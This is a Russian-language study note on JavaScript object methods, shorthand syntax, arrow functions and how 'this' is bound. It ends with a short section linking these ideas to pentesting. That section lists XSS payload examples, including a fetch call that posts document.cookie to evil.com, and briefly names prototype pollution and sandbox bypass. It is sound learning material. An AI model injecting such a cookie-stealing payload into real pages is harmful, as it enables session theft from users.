
# JS: Методы объекта, `this`

## 📌 Что это

**Метод** — функция, которая хранится в свойстве объекта. Позволяет объектам «действовать».

```js
let user = {
    name: "John",
    sayHi() {
        console.log("Привет!");
    }
};

user.sayHi();   // Привет!
```

---

## 🔧 Создание метода

### Способ 1 — Function Expression внутри объекта:

```js
let user = {
    name: "John"
};

user.sayHi = function() {
    console.log("Привет!");
};

user.sayHi();   // Привет!
```

### Способ 2 — заранее объявленная функция:

```js
function sayHi() {
    console.log("Привет!");
}

let user = { name: "John" };
user.sayHi = sayHi;

user.sayHi();   // Привет!
```

### Способ 3 — сокращённая запись в литерале:

```js
let user = {
    name: "John",
    sayHi() {              // ← без function
        console.log("Привет!");
    }
};
```

**Сравни:**
```js
sayHi: function() { ... }    // длинно
sayHi() { ... }              // коротко — используй это
```

⚠️ Сокращённая и полная запись **почти эквивалентны**. Различия — в наследовании (позже). Для базового уровня — неважно.

---

## 🎯 `this` — «объект перед точкой»

**`this` внутри метода** — это **объект, у которого вызвали метод**.

```js
let user = {
    name: "John",
    age: 30,
    sayHi() {
        console.log(this.name);   // this === user
    }
};

user.sayHi();   // John
```

**Правило:** если вызов `obj.method()` — то `this === obj` во время вызова.

---

## ⚠️ Почему **не** `user.name` внутри метода

**Работает, но ненадёжно:**

```js
let user = {
    name: "John",
    sayHi() {
        console.log(user.name);   // ← обращение к внешней переменной
    }
};

user.sayHi();   // John

let admin = user;
user = null;    // перезаписали переменную

admin.sayHi();  // ❌ TypeError: user is null
```

**С `this` — работает всегда:**

```js
let user = {
    name: "John",
    sayHi() {
        console.log(this.name);   // ← привязан к объекту-вызову
    }
};

let admin = user;
user = null;

admin.sayHi();   // ✅ John — this === admin
```

**Правило:** внутри метода — **всегда `this`**, а не имя внешней переменной.

---

## 🔄 `this` не фиксирован

`this` **вычисляется в момент вызова**, а не при объявлении.

```js
let user  = { name: "John" };
let admin = { name: "Admin" };

function sayHi() {
    console.log(this.name);
}

user.f  = sayHi;
admin.f = sayHi;

user.f();       // John   — this === user
admin.f();      // Admin  — this === admin
admin["f"]();   // Admin  — скобки и точка эквивалентны
```

**Одна и та же функция** — разное `this` в зависимости от **того, кто вызвал**.

---

## 🚫 Вызов без объекта: `this === undefined`

```js
function sayHi() {
    console.log(this);
}

sayHi();   // undefined (в строгом режиме)
sayHi();   // window (в нестрогом — историческое поведение)
```

⚠️ В **строгом режиме** (`"use strict"`) — `this === undefined`.

⚠️ Если внутри `this.name` — будет **ошибка** при вызове без объекта.

**Правило:** если в функции есть `this`, она **ожидает** вызова через объект.

---

## 🏹 Стрелочные функции — **нет своего `this`**

```js
let user = {
    firstName: "Ilya",
    sayHi() {
        let arrow = () => console.log(this.firstName);
        arrow();   // ← берёт this из внешней функции sayHi
    }
};

user.sayHi();   // Ilya
```

**Как это работает:**
- У стрелочной функции **нет своего `this`**.
- Она берёт `this` **из внешнего контекста** (лексически).
- Полезно, когда нужно сохранить `this` родителя.

**Сравни с обычной функцией:**
```js
let user = {
    firstName: "Ilya",
    sayHi() {
        let regular = function() {
            console.log(this.firstName);   // this === undefined
        };
        regular();   // ❌ TypeError
    }
};

user.sayHi();
```

**Правило:** стрелочная функция **не создаёт свой `this`** — использует родительский.

---

## 📊 Сводная таблица

| Вызов | `this` |
|-------|--------|
| `user.sayHi()` | `user` |
| `admin.sayHi()` | `admin` |
| `user["sayHi"]()` | `user` |
| `sayHi()` (без объекта) | `undefined` (strict) / `window` (не strict) |
| Внутри стрелочной | из внешней функции |
| Внутри обычной вложенной | `undefined` (strict) |

---

## 🎯 ООП — зачем это всё

**ООП** (объектно-ориентированное программирование) — подход, где программа строится из **объектов**, представляющих **сущности реального мира**.

- Пользователь → объект `user` с методами `login()`, `logout()`.
- Заказ → объект `order` с методами `pay()`, `cancel()`.
- Кнопка → объект `button` с методами `click()`, `hide()`.

**Методы + `this`** — основа ООП. Без них объекты — просто «склады данных».

---

## 🎯 Связь с пентестом

- **`document.querySelector(...)` — метод.** `document` — объект, `querySelector` — его метод. Внутри `this === document`.
- **`document.cookie` — свойство**, не метод. Просто данные.
- **`window.location.href` — свойство.** А `window.open()` — метод.
- **XSS-payload'ы используют методы:**
  ```js
  alert(document.cookie)
  fetch('https://evil.com', {method:'POST', body:document.cookie})
  document.write('<script>...')
  ```
- **Prototype Pollution атакует `this`:** подмена `this.__proto__` может изменить поведение всех объектов.
- **Обход sandbox** часто связан с подменой `this`:
  ```js
  someFunc.call(maliciousObject, ...)
  someFunc.apply(null, [...])
  ```
- **`this` в чужом коде** — важный маркер. Если видишь `this.x` — понимаешь, что это метод объекта.
- **Потеря `this` при передаче метода** — классическая ошибка, может приводить к утечкам данных:
  ```js
  let fn = user.sayHi;
  fn();   // this === undefined → ошибка
  ```
  В чужом коде это может быть уязвимостью.

---

## ✅ Чек-лист

- [✅] Умею создавать методы (3 способа)
- [✅] Понимаю сокращённую запись `sayHi() {}`
- [✅] Знаю, что `this` — объект перед точкой
- [✅] Понимаю, почему `this.name` лучше `user.name`
- [✅] Знаю, что `this` вычисляется при вызове
- [✅] Понимаю, что при вызове без объекта `this === undefined`
- [✅] Знаю, что стрелочные функции не имеют своего `this`
- [✅] Могу объяснить ООП одним предложением

---

## 📚 Источник

- [learn.javascript.ru → Методы объекта, "this"](https://learn.javascript.ru/object-methods)

